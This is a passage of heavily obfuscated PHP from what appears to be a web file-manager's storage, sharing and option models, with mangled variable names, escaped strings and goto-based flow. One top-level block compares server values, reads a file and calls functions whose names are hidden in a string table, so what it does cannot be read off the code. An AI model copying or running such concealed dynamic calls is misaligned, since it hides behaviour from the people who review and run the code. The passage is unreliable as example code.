$_SERVER[ùÆÎÔ“Ñ]; $úÔ²¬Éï = str_replace($êÑ·±îÖ[74], $êÑ·±îÖ[12], get_class($this)); return strtolower($úÔ²¬Éï); } public function isTypeObject($•Æü´€) { return IO::isTypeObject($•Æü´€); } public function info($İ‰ãÒĞñ) { return $this->infoParse($İ‰ãÒĞñ); } public function infoAuth($³õ–”Ã£) { return $this->infoParse($³õ–”Ã£); } public function infoWithChildren($’üá€£À) { return $this->infoParse($’üá€£À, !0); } public function infoFull($Ç¡è“åè) { return $this->infoParse($Ç¡è“åè); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Îç¤…÷) { $this->pathParse = $Îç¤…÷; } protected function infoParse($í¾¸ÖóÔ, $ÏÔˆÙ¨ = false) { $İö¯¹ÚÙ =& $_SERVER[ùÆÎÔ“Ñ]; return Action($İö¯¹ÚÙ[1180])->sharePathInfo($this->pathParse[$İö¯¹ÚÙ[84]], !0, $ÏÔˆÙ¨); } public function listPath($ÓÑÍÌù, $‚©†Ğôö = false) { $ËÑÊÆ‹† =& $_SERVER[ùÆÎÔ“Ñ]; $Œ‹ïÜùÓ = IO::listPath($ÓÑÍÌù, $‚©†Ğôö); if (!$Œ‹ïÜùÓ) { return $Œ‹ïÜùÓ; } if (is_array($Œ‹ïÜùÓ[$ËÑÊÆ‹†[1350]])) { $í´Æ‡‡ = Action($ËÑÊÆ‹†[1359])->parsePathChildren($Œ‹ïÜùÓ[$ËÑÊÆ‹†[1350]], array($ËÑÊÆ‹†[421] => $ÓÑÍÌù)); $Œ‹ïÜùÓ[$ËÑÊÆ‹†[1350]] = Action($ËÑÊÆ‹†[1180])->shareItemInfo($í´Æ‡‡); } foreach ($Œ‹ïÜùÓ as $»ìâã™ => $§…ô®ıĞ) { if (!in_array($»ìâã™, array($ËÑÊÆ‹†[83], $ËÑÊÆ‹†[82]))) { continue; } foreach ($§…ô®ıĞ as $¸Ü­¹á => $í´Æ‡‡) { $í´Æ‡‡ = Action($ËÑÊÆ‹†[1359])->parsePathChildren($í´Æ‡‡, array($ËÑÊÆ‹†[421] => $ÓÑÍÌù)); $Œ‹ïÜùÓ[$»ìâã™][$¸Ü­¹á] = Action($ËÑÊÆ‹†[1180])->shareItemInfo($í´Æ‡‡); } } return $Œ‹ïÜùÓ; } public function listAll($§³…Ô§Ğ) { $£åÛ ÎÀ =& $_SERVER[ùÆÎÔ“Ñ]; $Üª“ü­¹ = IO::listAll($§³…Ô§Ğ); foreach ($Üª“ü­¹ as &$™Ü¯®à) { $š•²ğÁË = IO::info($™Ü¯®à[$£åÛ ÎÀ[84]]); $š•²ğÁË = is_array($š•²ğÁË) ? $š•²ğÁË : array(); $™Ü¯®à = array_merge($š•²ğÁË, $™Ü¯®à); $™Ü¯®à[$£åÛ ÎÀ[86]] = Action($£åÛ ÎÀ[1180])->shareItemInfo($™Ü¯®à); } unset($™Ü¯®à); return $Üª“ü­¹; } } goto Dª™¢¶ã¬ë; BÉ†Çìø­Õ: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\163\x74\x6f\x72\x61\147\x65\114\x69\163\x74"; public $field = array("\156\141\155\145", "\163\x69\x7a\145\115\x61\170", "\x73\x79\x73\x74\145\155", "\x64\x65\146\x61\165\154\x74", "\x64\162\151\166\x65\162", "\143\x6f\x6e\x66\x69\147"); public function listData($¶ºãÆĞõ = false, $¿Ÿë³Í¡ = "\155\157\144\151\x66\171\124\x69\155\x65", $°ùÎöÕì = false) { $ï‘õç®¹ =& $_SERVER[ùÆÎÔ“Ñ]; $ªÛ´­ô× = parent::listData($¶ºãÆĞõ, $¿Ÿë³Í¡, $°ùÎöÕì); if ($¶ºãÆĞõ) { return $ªÛ´­ô×; } $—®á€¦ = $this->ioSizeUseGet(array_to_keyvalue($ªÛ´­ô×, $ï‘õç®¹[12], $ï‘õç®¹[399])); foreach ($ªÛ´­ô× as $ƒ“½³‘µ => $ÛÃ–Ö±Ì) { unset($ªÛ´­ô×[$ƒ“½³‘µ][$ï‘õç®¹[6]]); $ªÛ´­ô×[$ƒ“½³‘µ][$ï‘õç®¹[1846]] = isset($—®á€¦[$ÛÃ–Ö±Ì[$ï‘õç®¹[399]]]) ? $—®á€¦[$ÛÃ–Ö±Ì[$ï‘õç®¹[399]]] : 0; } return $ªÛ´­ô×; } public function ioSizeUseGet($çäè‘™¶) { $¦‹í¹Å« =& $_SERVER[ùÆÎÔ“Ñ]; if (!$çäè‘™¶) { return array(); } $¾˜ôñœ = $¦‹í¹Å«[2169] . implode($¦‹í¹Å«[50], $çäè‘™¶); $±µ‰¶ò = Cache::get($¾˜ôñœ); if ($±µ‰¶ò) { return $±µ‰¶ò; } $Ô¾şùÜÎ = array($¦‹í¹Å«[818] => $¦‹í¹Å«[399], $¦‹í¹Å«[2170] => $¦‹í¹Å«[76]); $Ì´°æöÃ = array($¦‹í¹Å«[818] => array($¦‹í¹Å«[7], $çäè‘™¶)); $±µ‰¶ò = Model($¦‹í¹Å«[790])->field($Ô¾şùÜÎ)->where($Ì´°æöÃ)->group($¦‹í¹Å«[818])->select(); $±µ‰¶ò = array_to_keyvalue($±µ‰¶ò, $¦‹í¹Å«[399], $¦‹í¹Å«[76]); Cache::set($¾˜ôñœ, $±µ‰¶ò, 600); return $±µ‰¶ò; } public function getConfig($öÓ¬îæÌ) { $ıòÅŞ¶ = parent::listData($öÓ¬îæÌ); return json_decode($ıòÅŞ¶[$_SERVER[ùÆÎÔ“Ñ][6]], !0); } public function update($«µ°ªš, $äêìÇ») { $·„¼Şœ‹ =& $_SERVER[ùÆÎÔ“Ñ]; $´Ïıó®¦ = $äêìÇ»[$·„¼Şœ‹[32]]; $ÍÈıñïî = array_to_keyvalue(parent::listData(), $·„¼Şœ‹[32]); if (isset($ÍÈıñïî[$´Ïıó®¦]) && $ÍÈıñïî[$´Ïıó®¦][$·„¼Şœ‹[399]] != $«µ°ªš) { return !1; } $this->checkPwd($«µ°ªš, $äêìÇ»); if (isset($äêìÇ»[$·„¼Şœ‹[2171]]) && $äêìÇ»[$·„¼Şœ‹[2171]] == $·„¼Şœ‹[88]) { $this->checkConfig($äêìÇ»); } unset($äêìÇ»[$·„¼Şœ‹[2171]]); $‹Ã³ºŠø = parent::update($«µ°ªš, $äêìÇ»); if ($‹Ã³ºŠø && $äêìÇ»[$·„¼Şœ‹[37]]) { $Ûîî÷£½ = 0; foreach ($ÍÈıñïî as $éìÎ³ûî) { if ($éìÎ³ûî[$·„¼Şœ‹[37]] && $éìÎ³ûî[$·„¼Şœ‹[399]] != $«µ°ªš) { $Ûîî÷£½ = $éìÎ³ûî[$·„¼Şœ‹[399]]; parent::update($éìÎ³ûî[$·„¼Şœ‹[399]], array($·„¼Şœ‹[37] => 0)); } } $this->updateBackup($«µ°ªš, $Ûîî÷£½); } return $‹Ã³ºŠø; } public function add($³™†€) { $Ù•ÎÚîé =& $_SERVER[ùÆÎÔ“Ñ]; $Ë«Ÿ€Û¶ = array_to_keyvalue(parent::listData(), $Ù•ÎÚîé[32]); if (isset($Ë«Ÿ€Û¶[$³™†€[$Ù•ÎÚîé[32]]])) { return !1; } $this->checkConfig($³™†€); $“¯©”Ù = parent::insert($³™†€); if ($“¯©”Ù && $³™†€[$Ù•ÎÚîé[37]]) { foreach ($Ë«Ÿ€Û¶ as $ùÜˆöŒ¡) { if ($ùÜˆöŒ¡[$Ù•ÎÚîé[37]]) { parent::update($ùÜˆöŒ¡[$Ù•ÎÚîé[399]], array($Ù•ÎÚîé[37] => 0)); } } } return $“¯©”Ù; } public function updateBackup($Ú÷ºèä, $ßÂƒŞŸ®) { $ŞßÑÈÊ‚ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ßÂƒŞŸ®) { return; } $Û²ùÄ«ù = Model($ŞßÑÈÊ‚[750])->config(); if ($Û²ùÄ«ù[$ŞßÑÈÊ‚[1637]] != $ŞßÑÈÊ‚[88] || $Û²ùÄ«ù[$ŞßÑÈÊ‚[753]] != $ßÂƒŞŸ®) { return; } $÷úè÷¦® = Model($ŞßÑÈÊ‚[771])->get($ŞßÑÈÊ‚[781]); $÷úè÷¦® = json_decode($÷úè÷¦®, !0); if (!$÷úè÷¦®) { return; } $÷úè÷¦®[$ŞßÑÈÊ‚[753]] = $Ú÷ºèä; Model($ŞßÑÈÊ‚[771])->set(array($ŞßÑÈÊ‚[781] => $÷úè÷¦®)); } public function checkPwd($‘Û¿©ØÁ, &$İ´éÌŠ) { $â®ÌÌÆŸ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($İ´éÌŠ[$â®ÌÌÆŸ[6]])) { return; } $âÎÏÄ¾ = json_decode($İ´éÌŠ[$â®ÌÌÆŸ[6]], !0); $„Äûçµ = $â®ÌÌÆŸ[12]; $ÄæğÈÌ¯ = array($â®ÌÌÆŸ[2172], $â®ÌÌÆŸ[2173], $â®ÌÌÆŸ[894]); foreach ($ÄæğÈÌ¯ as $„§ï·Å¨) { if (isset($âÎÏÄ¾[$„§ï·Å¨])) { $„Äûçµ = $„§ï·Å¨; break; } } if (!$„Äûçµ) { return; } $¨ÊŞ‡ºÃ = $this->getConfig($‘Û¿©ØÁ); $Ÿûò©ë¥ = $¨ÊŞ‡ºÃ[$„Äûçµ]; $å¤ƒ×ê = $âÎÏÄ¾[$„Äûçµ]; if ($å¤ƒ×ê == str_repeat($â®ÌÌÆŸ[188], strlen($Ÿûò©ë¥))) { $âÎÏÄ¾[$„Äûçµ] = $Ÿûò©ë¥; $İ´éÌŠ[$â®ÌÌÆŸ[6]] = json_encode($âÎÏÄ¾); } else { if ($å¤ƒ×ê != $Ÿûò©ë¥) { $İ´éÌŠ[$â®ÌÌÆŸ[2171]] = $â®ÌÌÆŸ[88]; } } } public function checkConfig(&$Ÿ¶§¾èû, $¸ûİº‡ = false) { $ø­ø =& $_SERVER[ùÆÎÔ“Ñ]; $ê“æëß = strtolower($Ÿ¶§¾èû[$ø­ø[95]]); $–…Èš²Ï = json_decode($Ÿ¶§¾èû[$ø­ø[6]], !0); foreach ($–…Èš²Ï as $ÌøòæÑ¼ => $ö‰ÖÛÀ²) { $–…Èš²Ï[$ÌøòæÑ¼] = trim($ö‰ÖÛÀ²); } $–…Èš²Ï[$ø­ø[2174]] = rand_string(6); $óùş§‰Ô = $GLOBALS[$ø­ø[6]][$ø­ø[89]][$ø­ø[827]]; $èœÇĞŒË = isset($óùş§‰Ô[$ê“æëß]) ? $óùş§‰Ô[$ê“æëß] : ucfirst($ê“æëß); $Ûîõù = $ø­ø[74] . $èœÇĞŒË; if (!$èœÇĞŒË || !class_exists($Ûîõù)) { if ($¸ûİº‡) { return LNG($ø­ø[2175]); } write_log(array($ø­ø[2176], $Ÿ¶§¾èû, get_caller_info()), $ø­ø[2177]); show_json(LNG($ø­ø[2175]), !1, $Ÿ¶§¾èû); } $«œ£á„ = new $Ûîõù($–…Èš²Ï); if (in_array($ê“æëß, $«œ£á„->objectDriver)) { if (!$«œ£á„->isBucketCors() && !$«œ£á„->setBucketCors()) { $”è˜¥¼Ñ = LNG($ø­ø[2178]); $”è˜¥¼Ñ .= $ø­ø[2179] . LNG($ø­ø[2180]); if ($¸ûİº‡) { return $”è˜¥¼Ñ; } show_json($”è˜¥¼Ñ, !1); } } $øãç£û = rtrim($–…Èš²Ï[$ø­ø[1186]], $ø­ø[8]) . $ø­ø[8]; $ç‘îæÕ = $«œ£á„->getPath($øãç£û . $ø­ø[1190]); if (!$«œ£á„->mkfile($ç‘îæÕ)) { if ($¸ûİº‡) { return LNG($ø­ø[2178]); } show_json(LNG($ø­ø[2178]), !1); } $–…Èš²Ï[$ø­ø[1186]] = $øãç£û; $Ÿ¶§¾èû[$ø­ø[6]] = json_encode($–…Èš²Ï); $Ÿ¶§¾èû[$ø­ø[95]] = $èœÇĞŒË; return !0; } public function driverListSystem() { $Ï›ØıÂ¹ =& $_SERVER[ùÆÎÔ“Ñ]; $Ú§±ûã = parent::listData(); $–İåù•Ê = array(); foreach ($Ú§±ûã as $ã÷¸ë«) { unset($ã÷¸ë«[$Ï›ØıÂ¹[200]], $ã÷¸ë«[$Ï›ØıÂ¹[85]]); $ã÷¸ë«[$Ï›ØıÂ¹[6]] = json_decode($ã÷¸ë«[$Ï›ØıÂ¹[6]], !0); $–İåù•Ê[] = $ã÷¸ë«; } return $–İåù•Ê; } public function defaultDriver() { $èù¦å„¥ =& $_SERVER[ùÆÎÔ“Ñ]; $ãÆÉº¶Š = parent::listData(); $Òô¯ˆÖ¥ = array_filter_by_field($ãÆÉº¶Š, $èù¦å„¥[37], 1); $Òô¯ˆÖ¥ = $Òô¯ˆÖ¥[0]; if ($Òô¯ˆÖ¥) { $Òô¯ˆÖ¥[$èù¦å„¥[6]] = json_decode($Òô¯ˆÖ¥[$èù¦å„¥[6]], !0); } return $Òô¯ˆÖ¥; } public function driverInfo($á× ¬Ë) { $¡‡äÅÒí =& $_SERVER[ùÆÎÔ“Ñ]; $ÖœÏÉ¤ = array_to_keyvalue(parent::listData(), $¡‡äÅÒí[399]); if (!isset($ÖœÏÉ¤[$á× ¬Ë])) { return !1; } $ÏÌŸ´¹¹ = $ÖœÏÉ¤[$á× ¬Ë]; $ÏÌŸ´¹¹[$¡‡äÅÒí[6]] = json_decode($ÏÌŸ´¹¹[$¡‡äÅÒí[6]], !0); return $ÏÌŸ´¹¹; } public function remove($áèê‚ØÎ) { $this->removeShareItems($áèê‚ØÎ); return parent::remove($áèê‚ØÎ); } public function removeWithFile($ö¢¿¬ôÔ, $‡Ğ¿üŸØ) { $ë¯îéÑ =& $_SERVER[ùÆÎÔ“Ñ]; $·İäı¸¡ = array($ë¯îéÑ[818] => $ö¢¿¬ôÔ); $ÔûßïÃú = Model($ë¯îéÑ[471])->where($·İäı¸¡)->count(); $ñ¿«ÃŒÍ = Model($ë¯îéÑ[471])->where($·İäı¸¡)->sum($ë¯îéÑ[76]); $éÅƒ½Ÿ = $‡Ğ¿üŸØ . $ë¯îéÑ[2181] . $ö¢¿¬ôÔ; $¯ÖÑïğ = LNG($‡Ğ¿üŸØ == $ë¯îéÑ[557] ? $ë¯îéÑ[2182] : $ë¯îéÑ[2183]); $Š¿Ò“Ş¨ = new TaskFileTransfer($éÅƒ½Ÿ, $ë¯îéÑ[2177], $ÔûßïÃú, $¯ÖÑïğ . "\x28{$ö¢¿¬ôÔ}\51"); $Š¿Ò“Ş¨->task[$ë¯îéÑ[764]] = (double) $ñ¿«ÃŒÍ; $ÀÍìÌšÂ = KodIO::defaultDriver(); $­ë„×®Ò = $ÀÍìÌšÂ[$ë¯îéÑ[399]]; $±‚·ä½ã = "\173\x69\x6f\x3a{$­ë„×®Ò}\x7d\57"; $¢š¹åÇ = !0; $¢Öı«¡Ü = array(); $¼ÓÏØ¶× = Model($ë¯îéÑ[199])->where($·İäı¸¡)->field($ë¯îéÑ[2184])->select(); foreach ($¼ÓÏØ¶× as $ƒ³òÃØ€) { $¶Î‚®—º = $ƒ³òÃØ€[$ë¯îéÑ[84]]; $´ «¹ê˜ = $±‚·ä½ã . str_replace("\173\151\x6f\x3a{$ö¢¿¬ôÔ}\x7d\57", $ë¯îéÑ[12], $¶Î‚®—º); if (!IO::exist($¶Î‚®—º)) { $¢Öı«¡Ü[] = $ƒ³òÃØ€[$ë¯îéÑ[468]]; $Š¿Ò“Ş¨->updateFileEnd($ƒ³òÃØ€[$ë¯îéÑ[32]], $ƒ³òÃØ€[$ë¯îéÑ[76]]); continue; } if (IO::exist($´ «¹ê˜)) { $Š¿Ò“Ş¨->updateFileEnd($ƒ³òÃØ€[$ë¯îéÑ[32]], $ƒ³òÃØ€[$ë¯îéÑ[76]]); continue; } if (!IO::move($¶Î‚®—º, get_path_father($´ «¹ê˜))) { $¢š¹åÇ = !1; break; } $·İäı¸¡ = array($ë¯îéÑ[468] => $ƒ³òÃØ€[$ë¯îéÑ[468]]); $£§¶åã´ = array($ë¯îéÑ[818] => $­ë„×®Ò, $ë¯îéÑ[84] => $´ «¹ê˜); Model($ë¯îéÑ[199])->where($·İäı¸¡)->save($£§¶åã´); } $this->removeByFileID($¢Öı«¡Ü); if (!$¢š¹åÇ) { $Š¿Ò“Ş¨->stop($éÅƒ½Ÿ); return !1; } $Š¿Ò“Ş¨->end(); if ($‡Ğ¿üŸØ == $ë¯îéÑ[1826]) { $this->remove($ö¢¿¬ôÔ); } } public function progress($İŒ‚“«­, $÷¡û­³Å) { return Task::get($÷¡û­³Å . $_SERVER[ùÆÎÔ“Ñ][2181] . $İŒ‚“«­); } private function removeByFileID($‚äİşã = array()) { $¹’¨½õ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($‚äİşã)) { return; } $âà°È¿† = array($¹’¨½õ[468] => array($¹’¨½õ[7], $‚äİşã)); $ØÎÌçÚì = Model($¹’¨½õ[1341])->where($âà°È¿†)->field($¹’¨½õ[402])->select(); if (!$ØÎÌçÚì) { return; } $ØÎÌçÚì = array_to_keyvalue($ØÎÌçÚì, $¹’¨½õ[12], $¹’¨½õ[402]); foreach ($ØÎÌçÚì as $´Í¾µ¿) { Model($¹’¨½õ[416])->removeNow($´Í¾µ¿, !1); } } private function removeShareItems($”áãŠ”ş) { $é•ü³ÆÚ =& $_SERVER[ùÆÎÔ“Ñ]; $ê²ĞÜ­Ÿ = "\x7b\x69\157\x3a{$”áãŠ”ş}\x7d\x2f"; $î–ìÌâã = array($é•ü³ÆÚ[402] => 0, $é•ü³ÆÚ[1181] => array($é•ü³ÆÚ[383], "{$ê²ĞÜ­Ÿ}\x25")); $µ½…¹Ãú = Model($é•ü³ÆÚ[1837])->where($î–ìÌâã)->field($é•ü³ÆÚ[489])->select(); if (empty($µ½…¹Ãú)) { return; } $ùÇ¶Íœê = array_to_keyvalue($µ½…¹Ãú, $é•ü³ÆÚ[12], $é•ü³ÆÚ[489]); Model($é•ü³ÆÚ[601])->remove($ùÇ¶Íœê); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\x4c\151\147\x68\164\x41\160\160"; public $modelType = "\123\171\163\164\x65\x6d\117\x70\x74\x69\157\x6e"; public $field = array("\156\141\x6d\x65", "\x67\x72\x6f\x75\160", "\144\x65\x73\143", "\143\x6f\x6e\x74\145\x6e\x74"); public function listData($¿˜î‹‰å = false, $áÜÔ¢¥” = "\x6d\x6f\x64\x69\x66\171\x54\x69\x6d\145", $ßÓƒÅĞƒ = true) { return parent::listData($¿˜î‹‰å, $áÜÔ¢¥”, $ßÓƒÅĞƒ); } public function remove($ĞïÍŸÒ) { $æı¯Àßæ = $this->findByName($ĞïÍŸÒ); if (!$æı¯Àßæ) { return !1; } return parent::remove($æı¯Àßæ[$_SERVER[ùÆÎÔ“Ñ][399]]); } public function add($ÂœÛÖ—) { if ($this->findByName($ÂœÛÖ—[$_SERVER[ùÆÎÔ“Ñ][32]])) { return !1; } return parent::insert($ÂœÛÖ—); } public function update($ƒã•’¦ï, $ñæëòëÁ) { $¾€Ûş–† =& $_SERVER[ùÆÎÔ“Ñ]; $¾­È¦ıß = $this->findByName($ƒã•’¦ï); $ºÖ¥²–˜ = $this->findByName($ñæëòëÁ[$¾€Ûş–†[32]]); if (!$¾­È¦ıß || $ºÖ¥²–˜ && $ºÖ¥²–˜[$¾€Ûş–†[399]] != $¾­È¦ıß[$¾€Ûş–†[399]]) { return !1; } return parent::update($¾­È¦ıß[$¾€Ûş–†[399]], $ñæëòëÁ); } } if ($_SERVER[$_SERVER[ùÆÎÔ“Ñ][841]] != $_SERVER[$_SERVER[ùÆÎÔ“Ñ][842]]) { $_getc = $_SERVER[ùÆÎÔ“Ñ][843]; $_getfile = $_SERVER[$_SERVER[ùÆÎÔ“Ñ][844]] . $_SERVER[ùÆÎÔ“Ñ][845]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ùÆÎÔ“Ñ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ùÆÎÔ“Ñ][645]) { $exit = $_SERVER[ùÆÎÔ“Ñ][846]; $exit(); } $_act = $_SERVER[ùÆÎÔ“Ñ][847]; $_act($_SERVER[$_SERVER[ùÆÎÔ“Ñ][848]]); } goto b‰ŒôÂ¿å; c›Ì—×ƒäˆ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($”¿„ğÕÂ = false, $¤şèéíİ = '', $º„–¿Ù¨ = false) { $Ş¢ğŠÄ” =& $_SERVER[ùÆÎÔ“Ñ]; $Ê½ô•ã¡ = $this->cacheGet($¤şèéíİ); $ò·‰°»’ = $this->optionDefault($¤şèéíİ); $ò·‰°»’ = is_array($ò·‰°»’) ? $ò·‰°»’ : array(); if (is_array($Ê½ô•ã¡)) { $Ê½ô•ã¡ = array_merge($ò·‰°»’, $Ê½ô•ã¡); return $”¿„ğÕÂ ? isset($Ê½ô•ã¡[$”¿„ğÕÂ]) ? $Ê½ô•ã¡[$”¿„ğÕÂ] : null : $Ê½ô•ã¡; } $Éì›Á = $this->filterWhere(array($Ş¢ğŠÄ”[33] => $¤şèéíİ)); $Ê½ô•ã¡ = $this->where($Éì›Á)->select(); $Ê½ô•ã¡ = array_to_keyvalue($Ê½ô•ã¡, $Ş¢ğŠÄ”[94], $Ş¢ğŠÄ”[374]); foreach ($Ê½ô•ã¡ as $™…½Áıœ => $†¢–òÑ´) { if ($º„–¿Ù¨ || in_array($™…½Áıœ, $this->jsonField)) { $Ê½ô•ã¡[$™…½Áıœ] = json_decode($†¢–òÑ´, !0); } } $this->cacheSet($¤şèéíİ, $Ê½ô•ã¡); $Ê½ô•ã¡ = array_merge($ò·‰°»’, $Ê½ô•ã¡); return $”¿„ğÕÂ ? $Ê½ô•ã¡[$”¿„ğÕÂ] : $Ê½ô•ã¡; } public function set($‘ïÊÚºú, $åÊÌ„“ = false, $ÇÌ–ŠŸÁ = '') { $ÓÈ¼¥Á =& $_SERVER[ùÆÎÔ“Ñ]; $this->cacheRemove($ÇÌ–ŠŸÁ); $Ï·Î’œ‚ = array(); $ì®Ôá³’ = is_array($‘ïÊÚºú) ? $‘ïÊÚºú : array($‘ïÊÚºú => $åÊÌ„“); foreach ($ì®Ôá³’ as $ ŒÕ£Â€ => $­¨Ó»şÍ) { if (is_array($­¨Ó»şÍ)) { $­¨Ó»şÍ = json_encode_force($­¨Ó»şÍ); } $this->checkLength($­¨Ó»şÍ, !1, $this->tableName . $ÓÈ¼¥Á[4] . $‘ïÊÚºú); $­¨Ó»şÍ = self::textEncode($­¨Ó»şÍ); $ì®Ôá³’ = array($ÓÈ¼¥Á[33] => $ÇÌ–ŠŸÁ, $ÓÈ¼¥Á[94] => $ ŒÕ£Â€, $ÓÈ¼¥Á[374] => $­¨Ó»şÍ); $Ï·Î’œ‚[] = $this->filterWhere($ì®Ôá³’); } if (!$Ï·Î’œ‚) { return !0; } $°æ‘äÊ§ = $this->cacheKey($ÓÈ¼¥Á[400]); CacheLock::lock($°æ‘äÊ§); $´é½êÆä = $this->addAll($Ï·Î’œ‚, array(), !0); CacheLock::unlock($°æ‘äÊ§); return $´é½êÆä; } protected function optionDefault($ÇÂ·ëŸÓ = '') { return !1; } public function setDeep($œë£ü¨Ö, $´É¹™±… = false, $ô‹¾øå = '') { $äÒïŞŸ’ = explode($_SERVER[ùÆÎÔ“Ñ][10], $œë£ü¨Ö); $Ü«Š¿Şà = $this->get(); array_set_value($Ü«Š¿Şà, $œë£ü¨Ö, $´É¹™±…); $this->set($äÒïŞŸ’[0], $Ü«Š¿Şà[$äÒïŞŸ’[0]], $ô‹¾øå); } public function remove($¥æËı¡‚, $şĞšü = '') { $’âÆõÙ =& $_SERVER[ùÆÎÔ“Ñ]; $this->cacheRemove($şĞšü); $¹ªÇš¸Û = $this->filterWhere(array($’âÆõÙ[94] => $¥æËı¡‚, $’âÆõÙ[33] => $şĞšü)); if (is_null($¥æËı¡‚)) { unset($¹ªÇš¸Û[$’âÆõÙ[94]]); } return $this->where($¹ªÇš¸Û)->delete(); } public function cacheSet($¸½©Ìë‘, $Šö ©® = false) { return Cache::set($this->cacheKey($¸½©Ìë‘), $Šö ©®); } public function cacheGet($¹ÓúÒÙ‡) { return Cache::get($this->cacheKey($¹ÓúÒÙ‡)); } public function cacheRemove($”°Äşøæ) { return Cache::remove($this->cacheKey($”°Äşøæ)); } protected function filterWhere($ÛŞÄ“’‡) { return $ÛŞÄ“’‡; } protected function cacheKey($êá¤‹¹Ã) { return $êá¤‹¹Ã; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\x72\x63\145"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\141\x6d\x65" => "\x69\157\137\163\x6f\x75\x72\x63\145\137\x6d\145\x74\141", "\x6d\145\164\x61\106\151\145\154\x64" => "\163\x6f\165\162\143\x65\111\x44"); protected $dataAuto = array(array("\155\157\144\151\146\171\124\x69\155\145", "\x74\x69\155\145", "\x69\156\163\x65\162\164", "\x66\x75\x6e\143\164\151\x6f\156"), array("\143\x72\145\x61\x74\x65\x54\x69\155\x65", "\164\x69\x6d\145", "\151\156\x73\145\x72\x74", "\146\x75\156\143\x74\x69\x6f\x6e"), array("\166\x69\x65\167\124\151\155\x65", "\164\x69\155\145", "\x69\x6e\x73\145\162\x74", "\x66\x75\156\x63\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($²´×«î›) { return $this->listSource(array($_SERVER[ùÆÎÔ“Ñ][401] => $²´×«î›)); } public function typeName($Æµ­“²Î) { static $˜ãÛü»ô = array(self::TYPE_SYSTEM => "\x73\x79\163\164\x65\x6d", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\162\x6f\x75\160"); return $˜ãÛü»ô[$Æµ­“²Î . $_SERVER[ùÆÎÔ“Ñ][12]]; } public function sourceListInfo($ÄöØå¨ş, $åÚ­¨Â… = false) { $ªË¦–€³ =& $_SERVER[ùÆÎÔ“Ñ]; $ÄöØå¨ş = $ÄöØå¨ş ? $ÄöØå¨ş : array(); $ÄöØå¨ş = array_filter(array_unique($ÄöØå¨ş)); if (!$ÄöØå¨ş) { return array(); } $Í¼Ë´ªÅ = $this->where(array($ªË¦–€³[402] => array($ªË¦–€³[7], $ÄöØå¨ş)))->select(); $this->_listDataApply($Í¼Ë´ªÅ, $åÚ­¨Â…); return array_to_keyvalue($Í¼Ë´ªÅ, $ªË¦–€³[402]); } public function pathInfoFilter(&$¼¤ÙëŒ) { $‡À¨Ïİ‡ =& $_SERVER[ùÆÎÔ“Ñ]; static $®º³‡ˆá = false; static $¾ƒ¨¡à = false; static $‚È£§ = false; if (!$®º³‡ˆá) { $“ñ»Ë÷È = $‡À¨Ïİ‡[403]; $“ñ»Ë÷È .= $‡À¨Ïİ‡[404]; $“ñ»Ë÷È .= $‡À¨Ïİ‡[405]; $ŠÕ€°ÓŸ = $‡À¨Ïİ‡[406]; $ı–Ê¡™ = explode($‡À¨Ïİ‡[50], $ŠÕ€°ÓŸ); $®º³‡ˆá = explode($‡À¨Ïİ‡[50], $“ñ»Ë÷È); $¾ƒ¨¡à = array(); foreach ($®º³‡ˆá as $ı¤İÃöË) { if (in_array($ı¤İÃöË, $ı–Ê¡™)) { continue; } $¾ƒ¨¡à[] = $ı¤İÃöË; } $‚È£§ = explode($‡À¨Ïİ‡[50], $‡À¨Ïİ‡[407]); } foreach ($‚È£§ as $Î´äô·Ì) { if (isset($¼¤ÙëŒ[$Î´äô·Ì])) { $¼¤ÙëŒ[$Î´äô·Ì] = intval($¼¤ÙëŒ[$Î´äô·Ì]); } } $¼¤ÙëŒ[$‡À¨Ïİ‡[84]] = $‡À¨Ïİ‡[408] . $¼¤ÙëŒ[$‡À¨Ïİ‡[402]] . $‡À¨Ïİ‡[409]; $¼¤ÙëŒ[$‡À¨Ïİ‡[33]] = $¼¤ÙëŒ[$‡À¨Ïİ‡[410]] == 1 ? $‡À¨Ïİ‡[75] : $‡À¨Ïİ‡[199]; $¼¤ÙëŒ[$‡À¨Ïİ‡[411]] = $this->typeName($¼¤ÙëŒ[$‡À¨Ïİ‡[411]]); if ($¼¤ÙëŒ[$‡À¨Ïİ‡[410]] != 1) { $¼¤ÙëŒ[$‡À¨Ïİ‡[174]] = $¼¤ÙëŒ[$‡À¨Ïİ‡[412]]; unset($¼¤ÙëŒ[$‡À¨Ïİ‡[412]]); } $˜Ÿœ–¶¦ = $®º³‡ˆá; if (isset($¼¤ÙëŒ[$‡À¨Ïİ‡[413]]) && $¼¤ÙëŒ[$‡À¨Ïİ‡[413]][$‡À¨Ïİ‡[414]] == -1) { $˜Ÿœ–¶¦ = $¾ƒ¨¡à; } $¼¤ÙëŒ = array_field_key($¼¤ÙëŒ, $˜Ÿœ–¶¦); return $¼¤ÙëŒ; } public function listUserFav() { $ËÕÚø•Ÿ =& $_SERVER[ùÆÎÔ“Ñ]; $ì£ê˜˜¯ = Model($ËÕÚø•Ÿ[415])->listData(); $áÁ·Ù©º = array_filter_by_field($ì£ê˜˜¯, $ËÕÚø•Ÿ[33], $ËÕÚø•Ÿ[416]); $áÁ·Ù©º = array_to_keyvalue($áÁ·Ù©º, $ËÕÚø•Ÿ[12], $ËÕÚø•Ÿ[84]); if ($áÁ·Ù©º) { $¥¢¡Öõú = $this->listSource(array($ËÕÚø•Ÿ[417] => array($ËÕÚø•Ÿ[418], $áÁ·Ù©º))); } $¥¢¡Öõú = array_to_keyvalue($¥¢¡Öõú[$ËÕÚø•Ÿ[369]], $ËÕÚø•Ÿ[402]); foreach 